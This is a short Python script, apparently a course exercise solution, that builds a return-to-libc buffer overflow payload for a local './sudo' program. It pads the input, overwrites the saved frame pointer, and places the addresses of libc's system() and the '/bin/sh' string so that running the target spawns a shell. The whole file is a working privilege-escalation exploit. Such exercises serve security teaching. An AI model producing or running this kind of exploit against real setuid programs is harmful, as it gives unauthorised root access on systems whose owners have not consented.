import os, sys
import addresses


PATH_TO_SUDO = './sudo'


def get_arg():
    # NOTES:
    # 1. Use `addresses.SYSTEM` to get the address of the `system` function
    # 2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string
    buff = 'a' * (0x49 - len("thisisasalt"))
    old_ebp = 'b' * 4
    bin_sh_add = addresses.address_to_bytes(addresses.LIBC_BIN_SH)
    system_libc_add = addresses.address_to_bytes(addresses.SYSTEM)
    system_ret = 'c' * 4 # doesn't matter for this question, just fill with arbitrary 4 bytes
    password = buff + old_ebp + system_libc_add + system_ret + bin_sh_add
    return password


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
